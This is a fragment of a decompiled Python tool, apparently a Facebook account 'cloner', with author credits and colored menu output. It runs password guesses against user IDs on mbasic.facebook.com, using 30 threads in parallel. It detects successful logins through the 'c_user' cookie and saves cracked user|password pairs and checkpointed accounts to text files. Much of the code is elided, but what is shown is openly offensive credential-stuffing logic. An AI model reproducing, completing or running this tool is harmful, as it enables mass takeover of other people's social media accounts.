...
# Time Succes decompile : 2022-05-05 09:22:26.100719
...
from concurrent.futures import ThreadPoolExecutor as meithunmmb
...
\033[1;31m\033[1;92m Author \x1b[1;97m : \033[1;92m           MOHAMMAD SAHEL

\033[1;31m\033[1;92m Facebook\x1b[1;97m:  \033[1;92m       Mohammad Sahel Chowdhury 

\033[1;31m\033[1;92m GitHub\x1b[1;97m  : \033[1;92m           Sahel Is The Brand

\033[1;31m\033[1;91m Version\x1b[1;97m : \033[1;91m             1.0.0
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97Sahel_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97Sahel_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back mmb Menu ")
...
def meithun():
    ...
    print('\033[1;93m [1] High Speed File Cloning')
    ...
    if _meithun___ in ('1', '01'):

        __xxx__().meithunx(id)

    if _meithun___ in ('2', '02'):

        create_file()

    if _meithun___ in ('E', 'ee'):
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[mmb] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Sahel-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('Sahel_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Sahel-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('Sahel_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with meithunmmb(max_workers=30) as mmbworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        mmbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
